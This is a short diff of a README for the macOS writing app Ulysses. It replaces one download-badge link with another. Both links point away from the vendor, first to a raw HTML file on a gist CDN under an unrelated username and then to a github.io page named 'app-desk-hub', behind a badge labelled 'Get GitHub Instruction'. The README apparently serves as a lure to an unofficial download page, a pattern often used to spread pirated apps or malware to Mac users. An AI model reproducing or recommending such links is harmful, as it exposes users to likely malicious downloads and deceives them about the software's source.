@@ -3,7 +3,7 @@
 **Ulysses** is a beautifully designed writing environment crafted exclusively for **macOS**.  
 It unites focus, organization, and creativity in a minimalist interface that helps writers turn ideas into finished works. ✍️  
 
-[![🟡 Get GitHub Instruction](https://img.shields.io/badge/🟡%20Get%20Ulysses%20MacOS-FFB300?style=for-the-badge&logo=bookstack&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/snoopdogstanprice1/a6c233f9dff6773e1a00e5e9a3334a0c/raw/2d458e6e6c01a7146fed691645b95afab0d0e8e0/macosapp.html?offer=Ulysses)
+[![🟡 Get GitHub Instruction](https://img.shields.io/badge/🟡%20Get%20Ulysses%20MacOS-FFB300?style=for-the-badge&logo=bookstack&logoColor=white&labelColor=0B0F19)](https://app-desk-hub.github.io/.github/?offer=Ulysses)
 
 ---
 
